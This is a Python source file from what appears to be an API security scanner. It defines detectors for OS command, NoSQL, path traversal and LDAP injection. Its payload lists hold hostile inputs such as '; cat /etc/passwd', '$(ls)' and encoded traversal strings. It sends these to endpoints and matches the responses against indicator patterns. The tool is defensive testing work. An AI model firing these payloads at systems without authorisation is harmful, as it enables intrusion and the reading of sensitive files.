"""Additional injection vulnerability detectors (Command Injection, NoSQL, LDAP, etc.)."""

import json
import re
from typing import List, Dict, Any
from urllib.parse import urlencode

from testing.detector_base import BaseDetector
from testing.models import (
    Vulnerability, VulnerabilityEvidence, VulnerabilitySeverity,
    VulnerabilityCategory, TestPriority
)
from parser.models import APISpecification, APIEndpoint


class CommandInjectionDetector(BaseDetector):
    """Detects OS Command Injection vulnerabilities."""
    
    def __init__(self):
        super().__init__(
            name="command_injection",
            category=VulnerabilityCategory.INJECTION,
            priority=TestPriority.CRITICAL
        )
        self.description = "Tests for OS command injection vulnerabilities"
        
        # Command injection payloads
        self.payloads = [
            "; ls -la",
            "| ls -la",
            "& ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ping -c 3 127.0.0.1",
            "| ping -c 3 127.0.0.1",
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            # Windows variants
            "& dir",
            "&& dir",
            "| dir",
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]
        
        # Command injection indicators
        self.indicators = [
            r"root:.*:0:0:",  # /etc/passwd content
            r"volume serial number",  # Windows dir output
            r"directory of",  # Windows dir output
            r"total \d+",  # ls -la output
            r"drwx",  # Unix directory listing
            r"-rwx",  # Unix file permissions
            r"uid=\d+",  # id command output
            r"gid=\d+",  # id command output
            r"command not found",
            r"syntax error",
            r"unexpected token",
            r"sh: ",  # Shell error prefix
            r"bash: ",  # Bash error prefix
        ]
    
    async def detect(self, endpoint: APIEndpoint, spec: APISpecification,
                    auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Detect command injection vulnerabilities."""
        vulnerabilities = []
        
        # Test query parameters
        query_params = self.get_query_parameters(endpoint)
        for param in query_params:
            vulns = await self._test_parameter_command_injection(
                endpoint, param, 'query', auth_headers, base_url
            )
            vulnerabilities.extend(vulns)
        
        # Test request body parameters
        if endpoint.method.upper() in ['POST', 'PUT', 'PATCH'] and endpoint.request_body:
            vulns = await self._test_body_command_injection(
                endpoint, auth_headers, base_url
            )
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_parameter_command_injection(self, endpoint: APIEndpoint, parameter: Dict[str, Any],
                                              param_type: str, auth_headers: Dict[str, str],
                                              base_url: str) -> List[Vulnerability]:
        """Test a specific parameter for command injection."""
        vulnerabilities = []
        param_name = parameter.get('name', '')
        
        for payload in self.payloads:
            try:
                if param_type == 'query':
                    url = self.build_url(base_url, endpoint)
                    query_string = urlencode({param_name: payload})
                    test_url = f"{url}?{query_string}"
                    
                    evidence = await self.make_request(
                        method=endpoint.method,
                        url=test_url,
                        headers=auth_headers
                    )
                
                # Check for command injection indicators
                if self._is_command_injection_vulnerable(evidence):
                    vulnerability = self.create_vulnerability(
                        title=f"OS Command Injection in {param_type} parameter '{param_name}'",
                        description=f"The {param_type} parameter '{param_name}' appears to be vulnerable to OS command injection. "
                                   f"This allows attackers to execute arbitrary system commands on the server, potentially "
                                   f"leading to complete system compromise, data theft, or denial of service.",
                        severity=VulnerabilitySeverity.CRITICAL,
                        endpoint=endpoint,
                        evidence=[evidence],
                        remediation="Never pass user input directly to system commands. Use safe APIs instead of shell commands. "
                                  "If shell commands are necessary, use strict input validation with allow-lists and proper escaping.",
                        cwe_id="CWE-78",
                        cvss_score=9.8
                    )
                    vulnerability.parameter = param_name
                    vulnerability.proof_of_concept = f"Parameter: {param_name}\nPayload: {payload}"
                    vulnerabilities.append(vulnerability)
                    break  # Found vulnerability
                    
            except Exception as e:
                pass
        
        return vulnerabilities
    
    async def _test_body_command_injection(self, endpoint: APIEndpoint, auth_headers: Dict[str, str],
                                         base_url: str) -> List[Vulnerability]:
        """Test request body for command injection."""
        vulnerabilities = []
        
        # Test common body field names that might be vulnerable
        vulnerable_fields = ['cmd', 'command', 'exec', 'execute', 'filename', 'file', 'path', 'url']
        
        for field in vulnerable_fields:
            for payload in self.payloads[:5]:  # Test subset for body
                try:
                    url = self.build_url(base_url, endpoint)
                    body = {field: payload}
                    
                    evidence = await self.make_request(
                        method=endpoint.method,
                        url=url,
                        headers={**auth_headers, 'Content-Type': 'application/json'},
                        body=json.dumps(body)
                    )
                    
                    if self._is_command_injection_vulnerable(evidence):
                        vulnerability = self.create_vulnerability(
                            title=f"OS Command Injection in request body field '{field}'",
                            description=f"The request body field '{field}' is vulnerable to OS command injection.",
                            severity=VulnerabilitySeverity.CRITICAL,
                            endpoint=endpoint,
                            evidence=[evidence],
                            remediation="Never execute user input as system commands. Use safe APIs.",
                            cwe_id="CWE-78",
                            cvss_score=9.8
                        )
                        vulnerability.parameter = field
                        vulnerability.proof_of_concept = f"Field: {field}\nPayload: {payload}"
                        vulnerabilities.append(vulnerability)
                        break
                        
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    def _is_command_injection_vulnerable(self, evidence: VulnerabilityEvidence) -> bool:
        """Check if response indicates command injection vulnerability."""
        if not evidence.response_body:
            return False
        
        response_text = str(evidence.response_body).lower()
        
        for pattern in self.indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def get_test_cases(self, endpoint: APIEndpoint, spec: APISpecification) -> List[Dict[str, Any]]:
        """Get test cases for this detector."""
        test_cases = []
        
        # Query parameter tests
        for param in self.get_query_parameters(endpoint):
            test_cases.append({
                'name': f"command_injection_query_{param.get('name')}",
                'parameter_type': 'query',
                'parameter_name': param.get('name'),
                'payload_count': len(self.payloads)
            })
        
        # Body parameter tests
        if endpoint.method.upper() in ['POST', 'PUT', 'PATCH'] and endpoint.request_body:
            test_cases.append({
                'name': "command_injection_body",
                'parameter_type': 'body',
                'parameter_name': 'request_body',
                'payload_count': len(self.payloads)
            })
        
        return test_cases


class NoSQLInjectionDetector(BaseDetector):
    """Detects NoSQL injection vulnerabilities."""
    
    def __init__(self):
        super().__init__(
            name="nosql_injection",
            category=VulnerabilityCategory.INJECTION,
            priority=TestPriority.HIGH
        )
        self.description = "Tests for NoSQL injection vulnerabilities (MongoDB, etc.)"
        
        # NoSQL injection payloads
        self.payloads = [
            "{'$gt': ''}",
            "{'$ne': null}",
            "{'$nin': []}",
            "admin' || '1'=='1",
            "' || 1==1//",
            "' || 1==1%00",
            "{$where: '1==1'}",
            "'; return true; var dummy='",
            "1'; return true; var dummy='1",
            "$where: function() { return true; }",
        ]
        
        # JSON-based payloads for body injection
        self.json_payloads = [
            {"$gt": ""},
            {"$ne": None},
            {"$nin": []},
            {"$exists": True},
            {"$regex": ".*"},
        ]
        
        # NoSQL error patterns
        self.error_patterns = [
            r"mongodb",
            r"mongoose",
            r"database error",
            r"\$where",
            r"\$gt",
            r"\$ne",
            r"nosql",
            r"couchdb",
            r"redis",
        ]
    
    async def detect(self, endpoint: APIEndpoint, spec: APISpecification,
                    auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Detect NoSQL injection vulnerabilities."""
        vulnerabilities = []
        
        # Test query parameters
        query_params = self.get_query_parameters(endpoint)
        for param in query_params:
            vulns = await self._test_parameter_nosql_injection(
                endpoint, param, auth_headers, base_url
            )
            vulnerabilities.extend(vulns)
        
        # Test request body
        if endpoint.method.upper() in ['POST', 'PUT', 'PATCH'] and endpoint.request_body:
            vulns = await self._test_body_nosql_injection(
                endpoint, auth_headers, base_url
            )
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_parameter_nosql_injection(self, endpoint: APIEndpoint, parameter: Dict[str, Any],
                                            auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Test parameter for NoSQL injection."""
        vulnerabilities = []
        param_name = parameter.get('name', '')
        
        for payload in self.payloads:
            try:
                url = self.build_url(base_url, endpoint)
                query_string = urlencode({param_name: payload})
                test_url = f"{url}?{query_string}"
                
                evidence = await self.make_request(
                    method=endpoint.method,
                    url=test_url,
                    headers=auth_headers
                )
                
                if self._is_nosql_injection_vulnerable(evidence):
                    vulnerability = self.create_vulnerability(
                        title=f"NoSQL Injection in query parameter '{param_name}'",
                        description=f"The query parameter '{param_name}' is vulnerable to NoSQL injection attacks. "
                                   f"This can allow attackers to bypass authentication, access unauthorized data, "
                                   f"or manipulate database queries in NoSQL databases like MongoDB.",
                        severity=VulnerabilitySeverity.HIGH,
                        endpoint=endpoint,
                        evidence=[evidence],
                        remediation="Use parameterized queries for NoSQL databases. Validate and sanitize all user input. "
                                  "Use strict type checking for database operations.",
                        cwe_id="CWE-943",
                        cvss_score=8.6
                    )
                    vulnerability.parameter = param_name
                    vulnerability.proof_of_concept = f"Parameter: {param_name}\nPayload: {payload}"
                    vulnerabilities.append(vulnerability)
                    break
                    
            except Exception as e:
                pass
        
        return vulnerabilities
    
    async def _test_body_nosql_injection(self, endpoint: APIEndpoint, auth_headers: Dict[str, str],
                                       base_url: str) -> List[Vulnerability]:
        """Test request body for NoSQL injection."""
        vulnerabilities = []
        
        # Test common authentication fields
        test_fields = ['username', 'email', 'id', 'userId', 'user_id']
        
        for field in test_fields:
            for payload in self.json_payloads:
                try:
                    url = self.build_url(base_url, endpoint)
                    body = {field: payload}
                    
                    evidence = await self.make_request(
                        method=endpoint.method,
                        url=url,
                        headers={**auth_headers, 'Content-Type': 'application/json'},
                        body=json.dumps(body)
                    )
                    
                    if self._is_nosql_injection_vulnerable(evidence):
                        vulnerability = self.create_vulnerability(
                            title=f"NoSQL Injection in request body field '{field}'",
                            description=f"The request body field '{field}' is vulnerable to NoSQL injection.",
                            severity=VulnerabilitySeverity.HIGH,
                            endpoint=endpoint,
                            evidence=[evidence],
                            remediation="Use parameterized queries and strict input validation.",
                            cwe_id="CWE-943",
                            cvss_score=8.6
                        )
                        vulnerability.parameter = field
                        vulnerabilities.append(vulnerability)
                        break
                        
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    def _is_nosql_injection_vulnerable(self, evidence: VulnerabilityEvidence) -> bool:
        """Check if response indicates NoSQL injection vulnerability."""
        if not evidence.response_body:
            return False
        
        response_text = str(evidence.response_body).lower()
        
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        # Check for authentication bypass (status 200 when it should be 401)
        if evidence.response_status == 200 and 'token' in response_text:
            return True
        
        return False
    
    def get_test_cases(self, endpoint: APIEndpoint, spec: APISpecification) -> List[Dict[str, Any]]:
        """Get test cases for this detector."""
        test_cases = []
        
        # Query parameter tests
        for param in self.get_query_parameters(endpoint):
            test_cases.append({
                'name': f"nosql_injection_query_{param.get('name')}",
                'parameter_type': 'query',
                'parameter_name': param.get('name'),
                'payload_count': len(self.payloads)
            })
        
        # Body parameter tests
        if endpoint.method.upper() in ['POST', 'PUT', 'PATCH'] and endpoint.request_body:
            test_cases.append({
                'name': "nosql_injection_body",
                'parameter_type': 'body',
                'parameter_name': 'request_body',
                'payload_count': len(self.json_payloads)
            })
        
        return test_cases


class PathTraversalDetector(BaseDetector):
    """Detects Path Traversal and Local File Inclusion vulnerabilities."""
    
    def __init__(self):
        super().__init__(
            name="path_traversal",
            category=VulnerabilityCategory.INJECTION,
            priority=TestPriority.HIGH
        )
        self.description = "Tests for path traversal and file inclusion vulnerabilities"
        
        # Path traversal payloads
        self.payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "C:\\windows\\win.ini",
            "file:///etc/passwd",
            "/var/log/apache/access.log",
            "/var/log/nginx/access.log",
            "../../../../../../../etc/passwd%00",
            "....//....//....//....//etc/passwd",
        ]
        
        # File inclusion indicators
        self.indicators = [
            r"root:.*:0:0:",  # /etc/passwd
            r"\[extensions\]",  # win.ini
            r"\[fonts\]",  # win.ini
            r"for 16-bit app support",  # win.ini
        ]
    
    async def detect(self, endpoint: APIEndpoint, spec: APISpecification,
                    auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Detect path traversal vulnerabilities."""
        vulnerabilities = []
        
        # Test query parameters
        query_params = self.get_query_parameters(endpoint)
        for param in query_params:
            param_name = param.get('name', '').lower()
            # Focus on file-related parameters
            if any(keyword in param_name for keyword in ['file', 'path', 'dir', 'folder', 'document', 'page', 'include']):
                vulns = await self._test_parameter_path_traversal(
                    endpoint, param, auth_headers, base_url
                )
                vulnerabilities.extend(vulns)
        
        # Test request body
        if endpoint.method.upper() in ['POST', 'PUT', 'PATCH'] and endpoint.request_body:
            vulns = await self._test_body_path_traversal(
                endpoint, auth_headers, base_url
            )
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_parameter_path_traversal(self, endpoint: APIEndpoint, parameter: Dict[str, Any],
                                           auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Test parameter for path traversal."""
        vulnerabilities = []
        param_name = parameter.get('name', '')
        
        for payload in self.payloads:
            try:
                url = self.build_url(base_url, endpoint)
                query_string = urlencode({param_name: payload})
                test_url = f"{url}?{query_string}"
                
                evidence = await self.make_request(
                    method=endpoint.method,
                    url=test_url,
                    headers=auth_headers
                )
                
                if self._is_path_traversal_vulnerable(evidence):
                    vulnerability = self.create_vulnerability(
                        title=f"Path Traversal/File Inclusion in parameter '{param_name}'",
                        description=f"The parameter '{param_name}' is vulnerable to path traversal attacks. "
                                   f"Attackers can read arbitrary files on the server by manipulating file paths, "
                                   f"potentially exposing sensitive configuration files, credentials, or source code.",
                        severity=VulnerabilitySeverity.HIGH,
                        endpoint=endpoint,
                        evidence=[evidence],
                        remediation="Never use user input directly in file system operations. Use a whitelist of "
                                  "allowed files, implement proper access controls, and use secure file access APIs. "
                                  "Validate that resolved paths stay within allowed directories.",
                        cwe_id="CWE-22",
                        cvss_score=7.5
                    )
                    vulnerability.parameter = param_name
                    vulnerability.proof_of_concept = f"Parameter: {param_name}\nPayload: {payload}"
                    vulnerabilities.append(vulnerability)
                    break
                    
            except Exception as e:
                pass
        
        return vulnerabilities
    
    async def _test_body_path_traversal(self, endpoint: APIEndpoint, auth_headers: Dict[str, str],
                                      base_url: str) -> List[Vulnerability]:
        """Test request body for path traversal."""
        vulnerabilities = []
        
        # Test common file-related fields
        test_fields = ['file', 'filename', 'filepath', 'path', 'document', 'page', 'include']
        
        for field in test_fields:
            for payload in self.payloads[:5]:  # Test subset for body
                try:
                    url = self.build_url(base_url, endpoint)
                    body = {field: payload}
                    
                    evidence = await self.make_request(
                        method=endpoint.method,
                        url=url,
                        headers={**auth_headers, 'Content-Type': 'application/json'},
                        body=json.dumps(body)
                    )
                    
                    if self._is_path_traversal_vulnerable(evidence):
                        vulnerability = self.create_vulnerability(
                            title=f"Path Traversal in request body field '{field}'",
                            description=f"The request body field '{field}' is vulnerable to path traversal.",
                            severity=VulnerabilitySeverity.HIGH,
                            endpoint=endpoint,
                            evidence=[evidence],
                            remediation="Use secure file access APIs and validate all file paths.",
                            cwe_id="CWE-22",
                            cvss_score=7.5
                        )
                        vulnerability.parameter = field
                        vulnerability.proof_of_concept = f"Field: {field}\nPayload: {payload}"
                        vulnerabilities.append(vulnerability)
                        break
                        
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    def _is_path_traversal_vulnerable(self, evidence: VulnerabilityEvidence) -> bool:
        """Check if response indicates path traversal vulnerability."""
        if not evidence.response_body:
            return False
        
        response_text = str(evidence.response_body)
        
        for pattern in self.indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def get_test_cases(self, endpoint: APIEndpoint, spec: APISpecification) -> List[Dict[str, Any]]:
        """Get test cases for this detector."""
        test_cases = []
        
        # Query parameter tests - focus on file-related parameters
        for param in self.get_query_parameters(endpoint):
            param_name = param.get('name', '').lower()
            if any(keyword in param_name for keyword in ['file', 'path', 'dir', 'folder', 'document', 'page', 'include']):
                test_cases.append({
                    'name': f"path_traversal_query_{param.get('name')}",
                    'parameter_type': 'query',
                    'parameter_name': param.get('name'),
                    'payload_count': len(self.payloads)
                })
        
        # Body parameter tests
        if endpoint.method.upper() in ['POST', 'PUT', 'PATCH'] and endpoint.request_body:
            test_cases.append({
                'name': "path_traversal_body",
                'parameter_type': 'body',
                'parameter_name': 'request_body',
                'payload_count': len(self.payloads)
            })
        
        return test_cases


class LDAPInjectionDetector(BaseDetector):
    """Detects LDAP injection vulnerabilities."""
    
    def __init__(self):
        super().__init__(
            name="ldap_injection",
            category=VulnerabilityCategory.INJECTION,
            priority=TestPriority.MEDIUM
        )
        self.description = "Tests for LDAP injection vulnerabilities"
        
        # LDAP injection payloads
        self.payloads = [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin*)((|(password=*",
            "admin*",
            ")(cn=*))",
            "*)(objectClass=*",
            "*))(|(cn=*",
        ]
        
        # LDAP error patterns
        self.error_patterns = [
            r"ldap",
            r"active directory",
            r"javax\.naming",
            r"ldap_search",
            r"ldap_bind",
            r"directory server",
        ]
    
    async def detect(self, endpoint: APIEndpoint, spec: APISpecification,
                    auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Detect LDAP injection vulnerabilities."""
        vulnerabilities = []
        
        # Test query parameters
        query_params = self.get_query_parameters(endpoint)
        for param in query_params:
            param_name = param.get('name', '').lower()
            # Focus on auth-related parameters
            if any(keyword in param_name for keyword in ['user', 'username', 'login', 'email', 'search', 'query']):
                vulns = await self._test_parameter_ldap_injection(
                    endpoint, param, auth_headers, base_url
                )
                vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_parameter_ldap_injection(self, endpoint: APIEndpoint, parameter: Dict[str, Any],
                                           auth_headers: Dict[str, str], base_url: str) -> List[Vulnerability]:
        """Test parameter for LDAP injection."""
        vulnerabilities = []
        param_name = parameter.get('name', '')
        
        for payload in self.payloads:
            try:
                url = self.build_url(base_url, endpoint)
                query_string = urlencode({param_name: payload})
                test_url = f"{url}?{query_string}"
                
                evidence = await self.make_request(
                    method=endpoint.method,
                    url=test_url,
                    headers=auth_headers
                )
                
                if self._is_ldap_injection_vulnerable(evidence):
                    vulnerability = self.create_vulnerability(
                        title=f"LDAP Injection in parameter '{param_name}'",
                        description=f"The parameter '{param_name}' is vulnerable to LDAP injection attacks. "
                                   f"This can allow attackers to bypass authentication, access unauthorized data, "
                                   f"or manipulate LDAP queries to retrieve sensitive directory information.",
                        severity=VulnerabilitySeverity.HIGH,
                        endpoint=endpoint,
                        evidence=[evidence],
                        remediation="Use parameterized LDAP queries. Validate and sanitize all user input. "
                                  "Escape special LDAP characters before using input in queries.",
                        cwe_id="CWE-90",
                        cvss_score=8.1
                    )
                    vulnerability.parameter = param_name
                    vulnerability.proof_of_concept = f"Parameter: {param_name}\nPayload: {payload}"
                    vulnerabilities.append(vulnerability)
                    break
                    
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def _is_ldap_injection_vulnerable(self, evidence: VulnerabilityEvidence) -> bool:
        """Check if response indicates LDAP injection vulnerability."""
        if not evidence.response_body:
            return False
        
        response_text = str(evidence.response_body).lower()
        
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        # Check for authentication bypass
        if evidence.response_status == 200 and 'user' in response_text:
            return True
        
        return False
    
    def get_test_cases(self, endpoint: APIEndpoint, spec: APISpecification) -> List[Dict[str, Any]]:
        """Get test cases for this detector."""
        test_cases = []
        
        # Query parameter tests - focus on auth-related parameters
        for param in self.get_query_parameters(endpoint):
            param_name = param.get('name', '').lower()
            if any(keyword in param_name for keyword in ['user', 'username', 'login', 'email', 'search', 'query']):
                test_cases.append({
                    'name': f"ldap_injection_query_{param.get('name')}",
                    'parameter_type': 'query',
                    'parameter_name': param.get('name'),
                    'payload_count': len(self.payloads)
                })
        
        return test_cases
